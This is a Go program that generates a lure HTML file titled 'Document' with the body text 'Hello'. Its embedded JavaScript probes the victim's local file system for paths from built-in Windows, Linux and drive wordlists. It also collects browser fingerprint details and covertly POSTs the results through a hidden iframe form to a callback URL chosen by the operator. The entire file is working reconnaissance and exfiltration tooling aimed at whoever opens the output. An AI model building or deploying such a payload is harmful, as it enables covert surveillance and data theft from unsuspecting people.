package main

import (
	_ "embed"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
)

//go:embed lists/drives.txt
var embeddedDrives string

//go:embed lists/linux.txt
var embbededLinux string

//go:embed lists/windows.txt
var embbededWindows string

func main() {
	outputToFileFlag := flag.String("output", "out.html", "File to save to")
	// mixIntoFileFlag := flag.String("mix", "", "Mixes the generated script with HTML file.")
	callbackFlag := flag.String("callback", "", "The URL to POST the data to when the file is opened - Ex. https://example.com/callback")
	wordlistFlag := flag.String("list", "", "Custom wordlist - Each line must be seperated by newlines \\n")

	flag.Parse()

	if len(*outputToFileFlag) == 0 {
		log.Printf("no output file assigned - using default '%s'", *outputToFileFlag)
	}
	if len(*callbackFlag) == 0 {
		log.Fatal("No callback assigned. Assign one via. the -callback flag.")
	}
	// create the word lists to check for
	dict := []string{}
	if len(*wordlistFlag) > 0 {
		f, err := os.ReadFile(*wordlistFlag)
		if err != nil {
			log.Fatal("failed to read custom list:", err)
		}
		ft := string(f)
		dict = strings.Split(ft, "\n")
	} else {
		dict = strings.Split(embeddedDrives, "\n")
		dict = append(dict, strings.Split(embbededLinux, "\n")...)
		dict = append(dict, strings.Split(embbededWindows, "\n")...)
	}
	list := []string{}
	for _, word := range dict {
		if len(strings.TrimSpace(word)) == 0 {
			continue
		}
		w := fmt.Sprintf("\"%s\"", word)
		w = w + ","
		list = append(list, w)
	}
	listLen := len(list)
	// remove the trailing , in the array
	list[listLen-1] = strings.TrimSuffix(list[listLen-1], ",")
	flatList := strings.Join(list, "")

	js := strings.TrimSpace(fmt.Sprintf(`
const sendTarget = "%s";
const data = {};
data.probe = {};
data.probe.currentPath = location.href;
data.probe.currentLocation = location.href;
data.probe.browserUserAgent = navigator.userAgent;
data.probe.browserLanguage = navigator.language;
data.probe.browserPlatform = navigator.platform;
data.probe.browserScreen = screen.width + "x" + screen.height

const lists = [%s];
const waitGroup = {
  i: 0
}

const probe = (path, data, waitGroup) => {
  waitGroup.i++
  const s = document.createElement("script")
  const target = document.children[0]
  s.src = path
  target.appendChild(s)
  s.onload = function() {
    data.probe[path] = true
    target.removeChild(s)
    waitGroup.i--
  }
  s.onerror = () => {
    target.removeChild(s)
    waitGroup.i--
  }
}

const submitForm = () => {
  const frame = document.createElement('iframe');
  frame.style = 'display: none;'
  const target = document.children[0];
  target.appendChild(frame);
  const form = document.createElement('form');
  form.method = "POST";
  form.action = sendTarget;
  Object.keys(data.probe).forEach(path => {
    const input = document.createElement('input');
    input.type = 'text';
    input.name = path;
	input.setAttribute('value', data.probe[path]);
    form.appendChild(input);
  })
  const inputSubmit = document.createElement('input');
  inputSubmit.type = 'submit';
  form.appendChild(inputSubmit);

  const wrapper = document.createElement('div');
  wrapper.appendChild(form);

  const sendScript = document.createElement('script');
  sendScript.innerHTML = 'document.querySelector("form").submit()';
  form.appendChild(sendScript)

  frame.src = 'data:text/html,'+encodeURIComponent(wrapper.innerHTML);
}


lists.forEach(path => probe(path, data, waitGroup))

var id = setInterval(() => {
  if(waitGroup.i === 0) {
    clearInterval(id)
    submitForm()
  }
}, 500)
`, *callbackFlag, flatList))

	html := strings.TrimSpace(fmt.Sprintf(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    Hello

	<script>
  		%s
	</script>
</body>
</html>
  `, js))

	err := os.WriteFile(*outputToFileFlag, []byte(html), os.ModePerm)
	if err != nil {
		log.Fatalf("failed to write to file: %s", err)
	}

	fmt.Printf("output written to '%s'\n", *outputToFileFlag)
}
